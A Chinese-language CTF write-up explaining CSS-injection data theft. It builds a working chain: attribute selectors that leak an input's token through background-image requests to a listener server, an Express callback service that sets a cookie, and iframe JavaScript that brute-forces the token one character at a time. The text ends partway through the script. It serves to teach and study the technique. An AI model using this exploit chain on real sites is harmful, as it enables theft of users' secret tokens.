这是本次比赛做起来最有跪感的一题了，当时比赛的时候怎么都弄不出来...赛后问了一下，主要还是差了一篇文章 [Wykradanie danych w
świetnym stylu – czyli jak wykorzystać CSS-y do ataków na
webaplikację](https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/)，这个标题是个波兰语，中文翻译过来就是使用 CSS 攻击 Web
应用程序，从文章内容也看到了 RPO 的攻击引述，也正是之前 noxss 2017 的解法。
[TOC]
# Preparation
**所做的实验测试均在 Chrome 78.0.3904.97 版本上** ，Firefox 有一些场景未测试成功。
我们需要的有 fontforge / nodejs / npm|yarn ，安装 [fontforge on
ubuntu](http://designwithfontforge.com/en-US/Installing_Fontforge.html)，安装
[nodejs on ubuntu](https://stackoverflow.com/questions/41195952/updating-nodejs-on-ubuntu-16-04)
## INTRO
在我们看题之前，我们先来看看一些简化的情况
首先创建一个 css.php ，内容如下：
        Document
    >
        var TOKEN = "";
这段代码也比较简单，input 标签与 script 标签内均有一个 token ，我们需要使用传入 css 参数来获取这两个 token
### Token1 - Get From Input
首先我们来尝试去获取第一个 token1 ，也就是在 input 标签内的 value 属性值，我们可控的只有 css 参数，所以我们只能去尝试构造 css
来获取 input 标签内的 value 属性值。
在 css 当中我们可以使用 css 选择器来选择我们的标签元素，例如
    /* 设置 body 标签元素 */
    body { }
    /* 设置 .test class 的样式 */
    .test { }
    /* 设置 id 为 test2 的样式 */
    #test2 { }
    /* 设置 value 为 abc 的 input 标签的样式 */
    input[value="abc"] { }
    /* 设置 value 为 a 开头的 input 标签的样式 */
    input[value^="a"] { }
我们可以看到在 css 选择器当中，我们可以设置类似`value^="a"`这样的选择器来获取我们的元素，所以这里我们大概可以有这么一个操作:
        Document
可以看到我们这里收到了`value^="7"`选择器发来的请求，所以我们也可以i使用枚举思想来进行爆破获取 token1
### Token1 - Auto Get From Input
剩下的就是要思考我们要如何去构造自动化工具去获取这个 token1 了，这里自动化的难点就在于如何获取爆破的时候是哪个字符正确了而发起了请求，无法拿到这个
callback 我们也就没有依据判断究竟是哪个字符注入正确了而发起了请求。
原文是采取了使用 cookie 的方式来进行这个 callback 的过程：
  * 在服务器上放置一个有 iframe 页面 index.html ，src 为要注入的页面 css
  * 建立一个服务供接受注入字符发来的请求，并且服务通过设置一个 cookie 来响应这个请求
  * index.html 根据 cookie 来进行判断注入的字符是否正确，正确的话就使用变量进行存储然后接着下一位的爆破
我们在服务端就需要提供这么些功能，所以我们可以构造这么个服务，用`npm install`或者`yarn`以下面这个 package.json 构建
    {
      "name": "css-attack-1",
      "version": "1.0.0",
      "description": "",
      "main": "index.js",
      "dependencies": {
        "express": "^4.15.5",
        "js-cookie": "^2.1.4"
      },
      "devDependencies": {},
      "author": "",
      "license": "ISC"
    }
以及相应的服务代码：
    const express = require('express');
    const app = express();
    app.disable('etag');
    const PORT = 3000;
    app.get('/token/:token',(req,res) => {
        const { token } = req.params; //var {a} = {a:1, b:2}; => var obj = {a:1, b:2};var a = obj.a;
            console.log(token);
        res.cookie('token',token);
        res.send('')
    });
    app.get('/cookie.js',(req,res) => {
        res.sendFile('js.cookie.js',{
            root: './node_modules/js-cookie/src/'
        });
    });
    app.get('/index.html',(req,res) => {
        res.sendFile('index.html',{
            root: '.'
        });
    });
    app.listen(PORT, () => {
        console.log(`Listening on ${PORT}...`);
    });
然后使用`node index.js`跑起来就行了。
整个流程大致是如下一个流程：
  1. 如果我们目前提取的 token 长度小于预期的长度，则我们执行以下操作
  2. 删除包含所有先前提取数据的 cookie
  3. 创建一个 iframe 标签，并 src 指向我们构造好的字符爆破的页面。
  4. 我们一直等到自己的服务 callback 为爆破请求设置含有 token 的 cookie
  5. 设置 cookie 后，我们将其设置为当前的已知 token 值，并返回到步骤1
所以我们可以有大致以下框架：
      (async function () {
        const EXPECTED_TOKEN_LENGTH = 32;
        const ALPHABET = Array.from("0123456789abcdef");
        const iframe = document.getElementById('iframe');
        let extractedToken = '';
        while (extractedToken.length 
首先我们可以直接使用 [js-cookie](https://github.com/js-cookie/js-cookie) 这个项目来直接清除
cookie
    function clearTokenCookie() {
        Cookies.remove('token');
    }
接下来，我们需要为 `iframe` 标签构造注入的页面 URL :
    function createIframeWithCss() {
      iframe.src = 'http://127.0.0.1/css.php?css=' + encodeURIComponent(generateCSS());
    }
以及生成 css 的函数：
    function generateCSS() {
      let css = '';
      for (let char of ALPHABET) {
        css += `input[value^="${extractedToken}${char}"] {
    background: url(http://127.0.0.1:3000/token/${extractedToken}${char})
    }`;
      }
      return css;
    }
最后我们需要实现通过等待反向连接来设置 cookie ，用 JS 中的 `Promise` 机制来构建异步函数，每隔50毫秒检查一次 cookie
是否已设置，如果已设置，该函数将立即返回该值。
    function getTokenFromCookie() {
        return new Promise(resolve => {
            const interval = setInterval(function() {
                const token = Cookies.get('token');
                if (token) {
                    clearInterval(interval);
                    resolve(token);
                }
            }, 50);
        });
    }
最后整合起来的攻击方式是这样的：
        Document
            (async function () {
                const EXPECTED_TOKEN_LENGTH = 32;
                const ALPHABET = Array.from("0123456789abcdef");
                const iframe = document.getElementById('iframe');
                let extractedToken = '';
                while (extractedToken.length  {
                        const interval = setInterval(function () {
                            const token = Cookies.get('token');
                            if (token) {
                                clearInterval(interval);
                                resolve(token);
                            }
                        }, 50);
                    });
                }
                function clearTokenCookie() {
                    Cookies.remove('token');
                }
                function generateCSS() {
                    let css = '';
                    for (let char of ALPHABET) {
                        css += `input[value^="${extractedToken}${char}"] {
                                background: url(http://127.0.0.1:3000/token/${extractedToken}${char})
                            }`;
                    }
                    return css;